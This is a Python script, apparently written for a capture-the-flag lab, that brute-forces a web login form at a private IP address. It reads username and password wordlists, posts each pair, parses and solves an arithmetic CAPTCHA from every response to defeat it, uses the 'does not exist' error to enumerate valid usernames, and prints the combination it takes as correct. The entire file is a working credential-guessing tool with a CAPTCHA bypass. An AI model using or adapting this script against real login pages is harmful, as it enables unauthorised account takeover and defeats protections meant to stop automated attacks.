import requests   # for http post request
import re         # for Regex library
import operator   # Converting string to operators

#### Opening files to read Usernames and Passwords
with open('./usernames') as u:
    users = u.read().splitlines()
with open('./passwords') as p:
    passes = p.read().splitlines()

#### setting Regex patterns for Captcha calculation and User existence check
pattern = "(\d{1,4}) (.) (\d{1,4})"
Fail_pattern = ".*does not exist.*"

#### initila value for Captcha
capcha = str(00000)

#### iterate over every user for every passwords
for user in users:
    for password in passes:
        ## URL and data to pass
        url = 'http://10.10.226.220/login'
        body = {'username': user , 'password': password, 'captcha': capcha}
        x = requests.post(url, body)

        try:
            ## search for captcha
            match = re.search(pattern, x.text)
            num1 = match.group(1)
            op = match.group(2)
            num2 = match.group(3)
            ops = { "+": operator.add, "-": operator.sub, "*":operator.mul, "/":operator.mod} # etc.
            capcha = str(ops[op](int(num1),int(num2))) # Calculate Captcha
            print(user + '---' +password)
        except:
            Success = 'User=' + user +  ' *** ' + 'Pass= ' + password
            print('==========================================')
            print('==========================================')
            print ('check user=' + user + 'password=' + password)
            print('==========================================')
            print('==========================================')
        if  len(re.findall(Fail_pattern, x.text)) > 0 :
            break

print('..................')
print('................................')
print (' correct username and password combination is: ' + Success)
